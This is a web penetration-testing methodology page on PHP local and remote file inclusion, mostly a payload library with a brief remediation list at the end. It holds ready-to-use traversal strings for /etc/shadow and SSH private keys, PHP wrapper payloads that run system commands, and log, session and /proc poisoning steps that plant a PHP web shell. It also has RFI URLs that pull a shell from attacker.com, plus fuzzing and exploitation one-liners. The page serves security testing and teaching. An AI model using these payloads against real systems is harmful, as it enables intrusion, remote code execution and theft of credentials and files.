---
title: "File Inclusion (LFI / RFI)"
date: 2026-02-24
draft: false
---

# File Inclusion (LFI / RFI)

> **Severity**: Critical | **CWE**: CWE-98, CWE-22
> **OWASP**: A03:2021 – Injection

---

## What Is File Inclusion?

PHP and other server-side languages allow dynamic file inclusion via `include()`, `require()`, `include_once()`, `require_once()`. When the included filename is attacker-controlled:

- **LFI (Local File Inclusion)** — read local files, potentially execute code via log poisoning or PHP wrappers
- **RFI (Remote File Inclusion)** — include remote URL as PHP code (requires `allow_url_include=On`)

```php
// Vulnerable code patterns:
include($_GET['page'] . ".php");       // append .php
include("pages/" . $_GET['template']); // prefix + user input
require($_POST['module']);              // full control
```

---

## Discovery Checklist

- [ ] Find parameters that load file paths: `page=`, `file=`, `template=`, `lang=`, `module=`, `include=`, `path=`, `view=`
- [ ] Test basic traversal: `../../../etc/passwd`
- [ ] Test with and without extension appending (does error show extension?)
- [ ] Test PHP wrappers: `php://filter`, `php://input`, `data://`, `expect://`
- [ ] Test null byte termination for PHP < 5.3.4: `../../../etc/passwd%00`
- [ ] Test path normalization: `....//....//....//etc/passwd`
- [ ] Test log poisoning → LFI to RCE
- [ ] Check error messages for absolute path disclosure
- [ ] Test RFI if app allows external URLs
- [ ] Test `/proc/self/environ` poisoning via User-Agent
- [ ] Test `/proc/self/fd/[n]` for open file descriptor log access
- [ ] Test ZIP/PHAR wrappers for LFI to RCE

---

## Payload Library

### Payload 1 — Basic LFI Path Traversal

```
# Linux targets:
../../../etc/passwd
../../../etc/shadow
../../../etc/hosts
../../../etc/hostname
../../../proc/version
../../../proc/self/cmdline
../../../proc/self/environ
../../../var/log/apache2/access.log
../../../var/log/apache2/error.log
../../../var/log/nginx/access.log
../../../var/log/auth.log
../../../var/log/mail.log
../../../home/USER/.bash_history
../../../home/USER/.ssh/id_rsa
../../../root/.bash_history
../../../root/.ssh/id_rsa
../../../etc/mysql/my.cnf
../../../etc/php/php.ini
../../../var/www/html/config.php

# Windows targets:
..\..\..\windows\win.ini
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\inetpub\wwwroot\web.config
..\..\..\xampp\apache\conf\httpd.conf
C:\windows\win.ini
C:\inetpub\wwwroot\web.config

# URL-encoded variants:
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd    # double-encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd  # overlong UTF-8

# Null byte (PHP < 5.3.4) — truncate extension append:
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd\0

# Dot truncation (Windows, long paths) — extension gets cut off:
../../../windows/win.ini..........[add many dots/spaces]

# Extra dot/slash normalization bypass:
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
..././..././..././etc/passwd
```

### Payload 2 — PHP Wrappers

```bash
# php://filter — read file source without executing (base64):
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../config.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php

# Decode base64 output:
echo "BASE64_OUTPUT" | base64 -d

# php://filter chains (PHP 8 / newer — multiple filters):
php://filter/convert.iconv.UTF-8.UTF-32|convert.base64-encode/resource=/etc/passwd

# php://input — execute POST body as PHP (requires allow_url_include or include):
# Send: include('php://input')
# POST body: <?php system($_GET['cmd']); ?>

# data:// wrapper — inline code execution:
data://text/plain,<?php system('id');?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
# base64 of: <?php system('id');?>

# expect:// — direct command execution (requires expect extension):
expect://id
expect://whoami
expect://cat+/etc/passwd

# zip:// wrapper — execute PHP in a ZIP archive:
# Create: echo "<?php system($_GET['cmd']); ?>" > shell.php && zip shell.zip shell.php
zip://path/to/uploaded/shell.zip%23shell.php

# phar:// wrapper — PHAR deserialization (see 20_Deser_PHP.md):
phar://path/to/uploaded/file.jpg

# Combining wrappers:
php://filter/convert.base64-decode/resource=data://text/plain,PD9waHAgcGhwaW5mbygpOz8+
```

### Payload 3 — Log Poisoning → LFI to RCE

Poison a log file with PHP code via a user-controlled field, then include the log file.

```bash
# Step 1: Poison Apache/Nginx access log via User-Agent:
curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com/

# Step 2: Include the poisoned log:
https://target.com/index.php?page=../../../var/log/apache2/access.log&cmd=id
https://target.com/index.php?page=../../../var/log/nginx/access.log&cmd=id

# Poison via Referer header:
curl -H "Referer: <?php system(\$_GET['cmd']); ?>" https://target.com/

# Poison via SSH auth log (/var/log/auth.log):
ssh '<?php system($_GET["cmd"]); ?>'@target.com
# Then include: ../../../var/log/auth.log

# Poison via mail log (if SMTP available):
telnet target.com 25
MAIL FROM: <?php system($_GET["c"]); ?>
# Then include: ../../../var/log/mail.log

# Poison via PHP session:
# 1. Set PHP session variable to PHP code:
curl -X POST https://target.com/login -d "username=<?php system(\$_GET['cmd']); ?>"
# 2. Read session ID from Set-Cookie header
# 3. Include: ../../../tmp/sess_SESSION_ID

# /proc/self/environ poisoning (older Linux):
# User-Agent is often in /proc/self/environ
curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com/
# Include: /proc/self/environ&cmd=id
```

### Payload 4 — `/proc` Filesystem LFI

```bash
# Read sensitive data from /proc:
/proc/self/cmdline          # running process command line (null-separated)
/proc/self/environ          # environment variables (may contain secrets)
/proc/self/maps             # memory maps (shows loaded libraries, paths)
/proc/self/status           # process status
/proc/self/fd/0             # stdin
/proc/self/fd/1             # stdout
/proc/self/fd/2             # stderr
/proc/self/fd/3             # often first open file (config, db connection)
/proc/self/fd/4
/proc/self/fd/5

# Brute-force open file descriptors:
for n in $(seq 0 20); do
  curl -s "https://target.com/?file=../../../proc/self/fd/$n" --max-time 2
done

# Network connections:
/proc/net/tcp               # open TCP connections (hex IPs/ports)
/proc/net/fds               # open file descriptors

# Container escape hints:
/proc/self/cgroup           # detect Docker/K8s (contains "docker" or pod ID)
/proc/1/cgroup              # PID 1 cgroup
```

### Payload 5 — RFI (Remote File Inclusion)

```bash
# Requires allow_url_include = On in php.ini (rare in modern setups)
# or allow_url_fopen = On (more common but only for wrappers)

# Basic RFI:
https://target.com/?page=http://attacker.com/shell.txt
https://target.com/?page=https://attacker.com/shell.txt
https://target.com/?page=ftp://attacker.com/shell.txt

# Attacker-hosted shell (shell.txt — no .php extension):
<?php system($_GET['cmd']); ?>

# Bypass extension appending via null byte (PHP < 5.3.4):
https://target.com/?page=http://attacker.com/shell.txt%00

# Bypass extension via query string:
https://target.com/?page=http://attacker.com/shell.txt?

# Self-referencing RFI:
https://target.com/?page=http://target.com/index.php?xss=%3C?php+system($_GET['cmd'])%3B?%3E

# SMB/UNC path (Windows servers):
https://target.com/?page=\\attacker.com\share\shell.php
```

### Payload 6 — LFI via PHP Session File

```bash
# Default PHP session storage:
# /tmp/sess_PHPSESSID
# /var/lib/php/sessions/sess_PHPSESSID
# /var/lib/php5/sess_PHPSESSID

# Step 1: Set a session variable with PHP code:
curl -s "https://target.com/login.php" \
  -X POST \
  -d "username=<?php system(\$_GET['c']); ?>&password=test" \
  -c cookies.txt

# Get session ID from cookies:
cat cookies.txt | grep PHPSESSID

# Step 2: Include session file:
curl "https://target.com/?page=/tmp/sess_SESSION_ID_HERE&c=id"

# Session paths to try:
/tmp/sess_SESSIONID
/var/lib/php/sessions/sess_SESSIONID
/var/lib/php5/sess_SESSIONID
/var/lib/php7.0/sessions/sess_SESSIONID
```

---

## Tools

```bash
# LFISuite — automated LFI scanner and exploiter:
git clone https://github.com/D35m0nd142/LFISuite
python lfiSuite.py

# liffy — LFI exploitation framework:
git clone https://github.com/mzfr/liffy

# ffuf for LFI parameter fuzzing:
ffuf -u "https://target.com/?page=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -fc 404,403

# Burp Intruder with LFI wordlist:
# /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

# php://filter wrapper automation:
curl "https://target.com/?page=php://filter/convert.base64-encode/resource=index" | \
  grep -oP '[A-Za-z0-9+/=]{20,}' | head -1 | base64 -d

# Log poisoning one-liner:
curl -A '<?php system($_GET["c"]); ?>' https://target.com/ -s -o /dev/null && \
curl "https://target.com/?page=../../../var/log/apache2/access.log&c=id"

# Wrappers test script:
for wrapper in "php://filter/convert.base64-encode/resource=index" \
               "data://text/plain,<?php phpinfo(); ?>" \
               "expect://id" \
               "php://input"; do
  echo "Testing: $wrapper"
  curl -s "https://target.com/?page=$wrapper" | head -5
done
```

---

## Remediation Reference

- **Never use user input in include/require paths** — use an allowlist of known filenames
- **Map to allowed files**: `$allowed = ['home', 'about']; if(in_array($page, $allowed)) include $page . '.php';`
- **Disable dangerous PHP settings**: `allow_url_include = Off`, `allow_url_fopen = Off`
- **Disable PHP wrappers** via open_basedir restriction: `open_basedir = /var/www/html`
- **Chroot/jail the web process**: restrict filesystem access
- **Disable `expect://` extension** if not required
- **Log file permissions**: web user should not be able to read system logs

*Part of the Web Application Penetration Testing Methodology series.*
